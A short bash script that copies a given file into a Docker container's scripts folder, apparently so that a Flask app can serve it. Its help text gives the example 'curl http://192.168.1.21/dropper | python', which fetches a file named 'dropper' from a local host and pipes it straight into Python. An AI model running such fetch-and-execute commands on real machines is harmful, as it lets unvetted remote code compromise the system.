#!/usr/bin/env bash

FILE="$1"

if [[ $FILE == "" || $FILE == "--help" || $FILE == "-h" ]]; then
    echo 'This script is used to copy a scirpt to the Flask App endpoint. This allows you to do things like: "curl http://192.168.1.21/dropper | python"'
    echo "Usage: ./script_install.sh <script path>"
else 
    /usr/bin/sudo /usr/bin/docker cp "$FILE" yggdrasil-handler:/app/scripts
fi